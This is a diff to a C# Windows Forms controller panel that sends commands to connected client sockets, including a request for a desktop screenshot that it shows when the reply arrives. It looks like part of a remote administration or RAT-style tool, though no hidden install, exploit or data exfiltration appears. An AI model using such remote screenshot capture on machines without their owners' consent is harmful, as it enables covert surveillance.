@@ -1,6 +1,9 @@
 ﻿using System;
 using System.Net;
 using System.Net.Sockets;
+using System.Text;
+using System.IO;
+using System.Drawing;
 using System.Windows.Forms;
 
 using Server.Core;
@@ -29,10 +32,9 @@ namespace Server.Forms {
                 
             };
 
-            server.OnDataReceived += (soc, msg) => {
+            server.OnDataReceived += (soc, answer) => {
                 IPEndPoint ip = soc.LocalEndPoint as IPEndPoint;
-                
-                this.Invoke((MethodInvoker)(() => listBox2.Items.Add(ip.Address + " :" + msg)));
+                DeserializeAnswer(answer);
             };
 
             server.StartListen();       
@@ -40,27 +42,56 @@ namespace Server.Forms {
 
         private void button2_Click(object sender, EventArgs e) {
             if(listBox1.Items.Count > 0) {
-                if(server.allConnections.Count > 0) {
-                    int selectedIndex = listBox1.SelectedIndex;
-                    Socket selectedSocket = server.allConnections[selectedIndex];
-                    TestCommand testCommand = new TestCommand();
-                    testCommand.Message = "Test";
-                    testCommand.MessageType = MessageTypes.TEST;
-                    server.Send<TestCommand>(testCommand, selectedSocket);
-                    server.StartReceive();
+                int selectedIndex = listBox1.SelectedIndex;
+                if(selectedIndex != -1) {
+                    server.listener = new Listener(server, server.allConnections[selectedIndex]);
+                    server.listener.StartReceive();
+                }
+            }
+        }
+        void DeserializeAnswer(CommandAnswer _answer) {
+            using(var ms = new MemoryStream(_answer.buffer)) {
+                switch(_answer.type) {
+                    case CommandTypes.DesktopScreenShot:
+                        pictureBox1.Image = Image.FromStream(ms);
+                        break;
+                    case CommandTypes.TestMessage:
+                    case CommandTypes.HelloWorld:
+                        MessageBox.Show(Encoding.ASCII.GetString(_answer.buffer));
+                        break;
                 }
             }
         }
 
         private void button3_Click(object sender, EventArgs e) {
             if(listBox1.Items.Count > 0) {
-                if(server.allConnections.Count > 0) {
-                    int selectedIndex = listBox1.SelectedIndex;
-                    Socket selectedSocket = server.allConnections[selectedIndex];
-                    TestCommand testCommand = new TestCommand();
-                    testCommand.Message = "Message";
-                    testCommand.MessageType = MessageTypes.MESSAGE;
-                    server.Send<TestCommand>(testCommand, selectedSocket);
+                int selectedIndex = listBox1.SelectedIndex;
+                if(selectedIndex != -1) {
+                    Command cmd = new Command();
+                    cmd.Message = "DesktopScreenShot";
+                    server.listener.Send<Command>(cmd, server.allConnections[selectedIndex]);
+                }
+            }
+        }
+
+        private void button4_Click(object sender, EventArgs e) {
+            if(listBox1.Items.Count > 0) {
+                int selectedIndex = listBox1.SelectedIndex;
+                if(selectedIndex != -1) {
+                    Command cmd = new Command();
+                    cmd.Message = "HelloWorld";
+                    server.listener.Send<Command>(cmd, server.allConnections[selectedIndex]);
+                }
+            }
+        }
+
+        private void button5_Click(object sender, EventArgs e) {
+            if(listBox1.Items.Count > 0) {
+                int selectedIndex = listBox1.SelectedIndex;
+                if(selectedIndex != -1) {
+                    Command cmd = new Command();
+                    cmd.Message = "TestMessage";
+                    server.listener.Send<Command>(cmd, server.allConnections[selectedIndex]);
                 }
             }
         }
